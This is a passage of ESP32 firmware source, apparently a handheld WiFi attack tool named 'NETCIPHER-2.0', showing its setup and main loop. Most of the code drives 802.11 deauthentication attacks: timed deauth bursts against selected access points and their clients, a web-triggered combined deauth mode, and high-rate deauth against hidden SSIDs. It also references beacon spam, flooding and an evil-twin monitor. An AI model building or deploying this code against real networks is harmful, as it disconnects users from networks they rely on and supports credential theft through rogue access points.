    u8g2.drawStr((128 - w) / 2, 38, "NETCIPHER-2.0");
    u8g2.setFont(u8g2_font_6x10_tf);
    String yourName = "BY Archit";  
    int w2 = u8g2.getStrWidth(yourName.c_str());
    u8g2.drawStr((128 - w2) / 2, 50, yourName.c_str());
    u8g2.sendBuffer();
    delay(500);
    
    initFileSystem();
    
    pinMode(BUTTON_UP, INPUT_PULLUP);
    pinMode(BUTTON_DOWN, INPUT_PULLUP);
    pinMode(BUTTON_OK, INPUT_PULLUP);
    pinMode(BUTTON_BACK, INPUT_PULLUP);
    pinMode(LED_PIN, OUTPUT);
    digitalWrite(LED_PIN, LOW);
    
    WiFi.mode(WIFI_STA);
    

    performScan();

    startAccessPoint();  
   
    lastButtonPressTime = millis();
    lastActivityTime = millis();
    xTaskCreatePinnedToCore(
    apDeauthTask,
    "APDeauth",
    4096,
    NULL,
    1,
    &apDeauthTaskHandle,
    1  // Core 1
);
}
void loop() {

    if (clientBlinkEndTime > 0 && millis() >= clientBlinkEndTime) {
        digitalWrite(LED_PIN, LOW);
        clientBlinkEndTime = 0;
    }

    if (millis() - last_temp_read >= 1000) {
        current_temp = temperatureRead();   // returns degrees Celsius
        last_temp_read = millis();
    }

    // Update reactive deauth packet rate every second


    if (current_temp > 85.0) {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_8x13_tf);
    u8g2.drawStr(10, 25, "OVERHEATING!");
    u8g2.drawStr(20, 45, (String(current_temp, 1) + "C").c_str());
    
    u8g2.sendBuffer();
    delay(5000);
    performDeepSleep();
    return;
    }

    if (webServerRunning) {
        // Admin mode - use admin routes
        dnsServer.processNextRequest();
        webServer.handleClient();
    }

    // If we're stuck in Evil-Twin monitor but it's not active, return to main
     
      

    menu();

   // Check connected stations - SKIP during station scan
if (!isAnyAttackActive()) {
    int currentStations = WiFi.softAPgetStationNum();
    if (currentStations != connectedClients) {
        lastActivityTime = millis();
        connectedClients = currentStations;
        
        if (connectedClients > 0) {
            digitalWrite(LED_PIN, HIGH);
            clientBlinkEndTime = millis() + 2000;
            totalConnections++;
        } else {
            digitalWrite(LED_PIN, LOW);
            clientBlinkEndTime = 0;
        }
    }
}
    // Station scan handling (sequential per AP with deauth bursts)
    // Station scan handling (sequential per AP with deauth bursts)
if (isScanningStations && !stationScanCancelled) {
    unsigned long now = millis();
    
    // Check if we've scanned the current AP long enough
    if (now - apScanStartTime >= SCAN_DURATION_PER_AP) {
        // Move to next AP
        currentTargetScanIndex++;
        
        Serial.printf("Moving to next AP. Current index: %d, Total selected: %d\n", 
                      currentTargetScanIndex, getSelectedTargetCount());
        
        if (!selectNextTargetForScan()) {
            // No more selected APs - scan complete
            Serial.println("All APs scanned. Stopping station scan.");
            stopStationScan(); // This will set currentScreen to SCREEN_STATION_SELECT
        } else {
            apScanStartTime = now; // reset timer for new AP
        }
    }
    
    // Deauth burst logic
    static unsigned long lastBurstStart = 0;
    static int packetsSentInBurst = 0;
    const unsigned long BURST_INTERVAL = 30000;   // 5 seconds between bursts
    const int PACKETS_PER_BURST = 10;             // 10 packets per burst
    const unsigned long BURST_DURATION = 1000;    // spread over 1 second

    // Start a new burst if enough time has passed
    if (now - lastBurstStart >= BURST_INTERVAL) {
        lastBurstStart = now;
        packetsSentInBurst = 0;
    }

    // Send packets during the burst window
    if (packetsSentInBurst < PACKETS_PER_BURST &&
        (now - lastBurstStart) < BURST_DURATION) {
        static unsigned long lastPacketTime = 0;
        if (now - lastPacketTime >= 100) {   // 10 packets per second = 100ms spacing
            // Build a temporary _Network for the current AP
            _Network target;
            target.ssid = currentScanSSID;
            target.ch = currentScanChannel;
            memcpy(target.bssid, currentScanBSSID, 6);
            target.rssi = 0;
            target.authmode = WIFI_AUTH_OPEN;   // dummy

            send_deauth_frame(&target);
            packetsSentInBurst++;
            lastPacketTime = now;
            lastActivityTime = now;

            if (packetsSentInBurst >= PACKETS_PER_BURST) {
                Serial.printf("Deauth burst complete for AP %s: %d packets\n",
                              currentScanSSID.c_str(), PACKETS_PER_BURST);
            }
        }
    } 

/*// Deauth burst: 10 packets in 1 second (100ms between packets), repeat every 5 seconds
static unsigned long lastBurstTime = 0;
static int packetsSent = 0;
_Network target;

// Reset burst every 5 seconds
if (millis() - lastBurstTime >= 5000) {
    lastBurstTime = millis();
    packetsSent = 0;
    
    // Build target from current AP
    target.ssid = currentScanSSID;
    target.ch = currentScanChannel;
    memcpy(target.bssid, currentScanBSSID, 6);
}

// Send one packet every 100ms until 10 packets sent (1 second total)
if (packetsSent < 10 && millis() - lastBurstTime >= (packetsSent * 100)) {
    send_deauth_frame(&target);
    packetsSent++;
} */


}




    if (deauthMonitorActive) {
        unsigned long now = millis();
        
        // Calculate deauth packets per second
        if (now - monitorLastRateCalcTime >= 1000) {
            monitorDeauthPktsPerSecond = monitorDeauthPacketCount - monitorLastDeauthPacketCount;
            monitorLastDeauthPacketCount = monitorDeauthPacketCount;
            monitorLastRateCalcTime = now;
        }

        // Only auto-hop channels if in automatic mode
        if (deauthMonitorAutomatic && (now - lastChannelChange > CHANNEL_HOP_INTERVAL)) {
            currentMonitorChannel++;
            if (currentMonitorChannel > 14) currentMonitorChannel = 1;
            esp_wifi_set_channel(currentMonitorChannel, WIFI_SECOND_CHAN_NONE);
            lastChannelChange = now;
        }
    }
    
    // Handle pending web commands (deferred from web callback)
    if (pendingWebCommand != "" && (millis() - lastWebCommandTime >= WEB_COMMAND_DEBOUNCE)) {
        if (pendingWebCommand == "DEAUTH") {
            combinedDeauthActive = !combinedDeauthActive;
            
            if (combinedDeauthActive) {
                resetDeauthIndices();
                lastActivityTime = millis();
                
                // Stop other attacks
                flood_active = false;
                deauthAllActive = false;
                beaconSpam.stop();
                if (deauthMonitorActive) stopDeauthMonitor();
                if (isScanningStations) stopStationScan();
                if (hiddenRecoveryActive) stopHiddenRecovery();
                
                if (apAndWebRunning) {
                    webServer.stop();
                    dnsServer.stop();
                    WiFi.softAPdisconnect(true);
                    apAndWebRunning = false;
                }
                
                yield();  // Let WiFi task run
                delay(50);
                
                startAccessPoint();
                
                // Start combined deauth
                apDeauthActive = hasSelectedTargets();
                stationDeauthActive = (getSelectedStationCount() > 0);
                
                WiFi.disconnect(false);
                delay(100);
                WiFi.mode(WIFI_AP);
                delay(100);
                esp_wifi_set_mode(WIFI_MODE_AP);
                esp_wifi_start();
                
                // Set channel to first selected AP if available
                for (int i = 0; i < MAX_TARGETS; i++) {
                    if (_networks[i].selected && isValidAP(_networks[i])) {
                        setSoftAPChannel(_networks[i].ch);
                        break;
                    }
                }
                
                deauthing_active = true;
                attack_running = true;
                currentScreen = SCREEN_DEAUTHER;
                Serial.println("Deauth started from web");
            } else {
                combinedDeauthActive = false;
                apDeauthActive = false;
                stationDeauthActive = false;
                deauthing_active = false;
                attack_running = false;
                resetDeauthIndices();
                currentScreen = SCREEN_MAIN;
                Serial.println("Deauth stopped from web");
            }
        }
        
        pendingWebCommand = "";  // Clear the pending command
    }
    
    // Hidden SSID deauth handling
    if (hiddenDeauthActive) {
        unsigned long now = millis();
        
        // Stop after 10 seconds
        
        
        // Send at high rate
        if (now - lastHiddenDeauthTime >= HIDDEN_DEAUTH_INTERVAL) {
            _Network hiddenTarget;
            hiddenTarget.ssid = "";
            hiddenTarget.ch = hiddenTargetChannel;           // global variable
            memcpy(hiddenTarget.bssid, hiddenTargetBSSID, 6); // global variable
            hiddenTarget.rssi = 0;
            hiddenTarget.authmode = WIFI_AUTH_OPEN;
            esp_wifi_set_channel(hiddenTargetChannel, WIFI_SECOND_CHAN_NONE);
            static int pattern = 0;
            pattern = (pattern + 1) % 1;
            flood_send_deauth_attack(&hiddenTarget, pattern);
            lastHiddenDeauthTime = now;
            lastActivityTime = now;
        }
    }
} 
